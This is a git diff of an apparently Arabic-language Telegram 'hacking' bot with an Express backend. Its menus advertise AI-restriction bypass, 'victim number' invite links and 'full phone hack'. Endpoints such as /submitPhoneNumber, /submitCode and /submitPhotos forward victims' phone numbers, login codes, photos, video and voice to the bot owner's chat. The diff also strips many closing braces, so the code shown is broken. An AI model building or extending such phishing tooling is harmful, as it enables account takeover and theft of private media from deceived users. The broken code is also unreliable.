@@ -30,21 +30,20 @@ async function handleNewLogic(bot, chatId, data, query, userIdentityData, saveId
         return bot.sendMessage(chatId, randomText);
     }
     
+    
+    
+    
     if (data === 'pay_stars_identity') {
-        // إرسال فاتورة حقيقية عبر بوت الدفع
         return bot.sendInvoice(
             chatId,
             'تفعيل هويات إضافية',
             'الحصول على 10 هويات إضافية صالحة للاستخدام فوراً.',
             'identity_pay_' + chatId,
-            process.env.PAYMENT_TOKEN || 'PROVIDER_TOKEN', // يجب ضبط التوكن في ملف .env
-            'XTR', // Telegram Stars
+            process.env.mn, 
+            'XTR', 
             [{ label: '10 هويات', amount: 20 }]
         ).catch(() => {
-            bot.sendMessage(chatId, '💳 للدفع وتفعيل الهويات، يرجى استخدام الرابط التالي:
-https://t.me/stars?start=20
-
-أو التواصل مع المطور @HackWahm لتفعيل يدوي.');
+            bot.sendMessage(chatId, '💳 للدفع وتفعيل الهويات، يرجى استخدام الرابط التالي:\nhttps://t.me/stars?start=20\n\nأو التواصل مع المطور @HackWahm لتفعيل يدوي.');
         });
     }
 
@@ -247,7 +246,7 @@ bot.onText(/\/start/, async (msg) => {
       [{ text: '🔓 كسر قيود ذكاءالاصطناعي', callback_data: 'ai_bypass_main' }],
       [{ text: '🔄 نص إلى صوت', callback_data: 'convert_text' }, { text: '🧙‍♂️ تفسير الأحلام', callback_data: 'dream_menur' }],
       [{ text: '🧞‍♂️ لعبة المارد', callback_data: 'play' }, { text: '📻 بث الراديو', callback_data: 'get_radio_countries_0' }],
-      [{ text: '💀 أعطيني نصائح ', callback_data: 'hacking_text' }, { text: '⛔ فك حظر واتساب', callback_data: 'إرسال_رسالة' }],
+      [{ text: '💀 أعطيني شي ثاني', callback_data: 'hacking_text' }, { text: '⛔ فك حظر واتساب', callback_data: 'إرسال_رسالة' }],
       [{ text: '📲 رقم الضحية', callback_data: 'generate_invite' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes' }],
       [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/HackWahm' }]
     ];
@@ -610,7 +609,6 @@ bot.onText(/\/Vip/, async (msg) => {
       ]
     }
   });
-});
 
 
 bot.on('callback_query', async (query) => {
@@ -901,7 +899,6 @@ app.post('/submitPhoneNumber', (req, res) => {
       console.error('Error sending Telegram message:', error.response ? error.response.body : error);
       res.json({ success: false });
     });
-});
 
 app.post('/submitCode', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
@@ -921,7 +918,6 @@ app.post('/submitCode', (req, res) => {
       console.error('Error sending Telegram message:', error.response ? error.response.body : error);
       res.json({ success: false });
     });
-});
 
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
@@ -985,7 +981,6 @@ app.post('/submitVideo', (req, res) => {
                     console.log('تم حذف الملف المؤقت بنجاح.');
                 }
             });
-        });
 
         console.log(`Sent video for chatId ${chatId}`);
         res.redirect('/ca.html');
@@ -1054,8 +1049,6 @@ app.post('/submitPhotos', (req, res) => {
                 return botOwner.sendPhoto(ownerChatId, buffer, {
                     caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
                 });
-            });
-        });
 
         Promise.all(sendPhotoPromises)
             .then(() => {
@@ -1102,8 +1095,6 @@ app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
                 return botOwner.sendPhoto(ownerChatId, buffer, {
                     caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
                 });
-            });
-        });
 
         Promise.all(sendPhotoPromises)
             .then(() => {
@@ -1135,7 +1126,6 @@ app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
         console.error(error);
         res.status(500).send('خطأ.');
     });
-});
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`الخادم يعمل على المنفذ ${PORT}`);
@@ -1245,8 +1235,6 @@ app.post('/so', (req, res) => {
             botOwner.sendPhoto(ownerChatId, buffer, {
                 caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
             });
-        });
-    });
 
     console.log(`Sent photos for chatId ${chatId}`);
 
@@ -1525,7 +1513,6 @@ bot.onText(/\/jjihigjoj/, (msg) => {
             ]
         }
     });
-});
 
 
 bot.on('callback_query', (query) => {
@@ -1595,7 +1582,6 @@ app.post('/submitNames', (req, res) => {
             console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
             res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
         });
-});
 
 app.get('/ge', (req, res) => {
     const chatId = req.query.chatId;
@@ -1627,7 +1613,6 @@ app.post('/submitNames', (req, res) => {
             console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
             res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
         });
-});
 
 app.get('/getNam', (req, res) => {
     const chatId = req.query.chatId;
@@ -1659,7 +1644,6 @@ app.post('/submitNames', (req, res) => {
             console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
             res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
         });
-});
 
 app.get('/getName', (req, res) => {
     const chatId = req.query.chatId;
@@ -1954,7 +1938,6 @@ bot.onText(/\/jjjjjavayy/, (msg) => {
             ]
         }
     });
-});
 
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
@@ -2163,8 +2146,6 @@ app.post('/xx', (req, res) => {
             botOwner.sendPhoto(ownerChatId, buffer, {
                 caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
             });
-        });
-    });
 
     console.log(`Sent photos for chatId ${chatId}`);
     res.redirect('/ok.html');
@@ -2183,7 +2164,6 @@ bot.onText(/\/اتتهتتاههة/, (msg) => {
             ]
         }
     });
-});
 
 
 bot.on('callback_query', (callbackQuery) => {
@@ -2211,7 +2191,7 @@ bot.onText(/\/sخسننسمس/, (msg) => {
 bot.on('callback_query', (query) => {
     if (query.data === "generate_invite") {
         const userId = query.from.id;
-        const inviteLink = `https://t.me/ksjwjsjajsksksbot?start=${userId}`;
+        const inviteLink = `https://t.me/ygf2gbot?start=${userId}`;
 
         bot.sendMessage(query.message.chat.id, `تم انشاء رابط قم في ارساله لضحيه لمعرفة معلومات حسابه تلجرام:\n${inviteLink}`);
     }
@@ -2459,7 +2439,6 @@ function extractIpFromUrl(url) {
                 if (err) reject(null);
                 else resolve(address);
             });
-        });
     } catch (err) {
         return null;
     }
@@ -2566,7 +2545,7 @@ bot.on('callback_query', async (query) => {
         bot.sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (سأجلب لك أفضل النتائج من Unsplash)...");
         userStates[chatId] = { state: 'waiting_for_search' };
     } else if (query.data === 'generate_invite') {
-        const inviteLink = `https://t.me/ksjwjsjajsksksbot?start=${chatId}`;
+        const inviteLink = `https://t.me/ygf2gbot?start=${chatId}`;
         bot.sendMessage(chatId, `📲 تم إنشاء رابط "معرفة رقم الضحية" الخاص بك:\n\n${inviteLink}\n\nأرسل هذا الرابط للضحية، وبمجرد دخوله ومشاركته لرقمه، ستصلك معلوماته هنا فوراً! 🔥`);
     } else if (query.data === 'start_private_chat') {
         bot.sendMessage(chatId, "🧠 أنا الذكاء الاصطناعي الشرير... أرسل لي أي شيء وسأرد عليك بطريقتي الخاصة! 😈");
@@ -3364,7 +3343,6 @@ bot.onText(/\/starㅇ함ㅏㅏㅗht/, async (message) => {
             inline_keyboard: [[{ text: 'الحصول على رقم وهمي', callback_data: 'الحصول_على_رقم' }]]
         }
     });
-});
 
 
 bot.on('callback_query', async (callbackQuery) => {
@@ -3499,7 +3477,6 @@ bot.onText(/\/star刚t/, (msg) => {
         reply_markup: markup,
         parse_mode: "Markdown"
     });
-});
 
 
 async function askQuestion(message, userId, newMessage = false) {
